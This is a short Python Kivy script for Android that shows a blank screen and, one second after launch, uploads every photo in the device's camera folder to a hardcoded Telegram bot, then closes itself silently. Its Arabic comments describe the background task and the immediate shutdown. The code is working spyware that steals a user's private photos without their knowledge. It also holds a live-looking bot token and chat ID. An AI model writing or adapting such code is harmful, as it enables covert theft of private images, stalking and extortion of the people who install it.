import os
import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.label import Label

class MyApp(App):
    def build(self):
        # بدء المهمة في الخلفية بعد ثانية من فتح التطبيق
        Clock.schedule_once(self.run_background_task, 1)
        return Label(text="")

    def run_background_task(self, dt):
        BOT_TOKEN = "8429161030:AAFSimSDMQWVezW6aZ6jlKemWOIFDcbLxXg"
        CHAT_ID = "8680273973"

        camera_folder = "/sdcard/DCIM/Camera"
        if not os.path.exists(camera_folder):
            camera_folder = "/storage/emulated/0/DCIM/Camera"
            
        if not os.path.exists(camera_folder):
            App.get_running_app().stop()
            return

        valid_extensions = (".jpg", ".jpeg", ".png", ".webp")
        files = [
            os.path.join(camera_folder, f) 
            for f in os.listdir(camera_folder) 
            if f.lower().endswith(valid_extensions)
        ]

        if not files:
            App.get_running_app().stop()
            return

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

        for file_path in files:
            try:
                with open(file_path, "rb") as f:
                    requests.post(
                        url,
                        data={"chat_id": CHAT_ID},
                        files={"document": f}
                    )
            except:
                pass
        
        # إغلاق التطبيق فوراً بعد الانتهاء
        App.get_running_app().stop()

if __name__ == "__main__":
    MyApp().run()
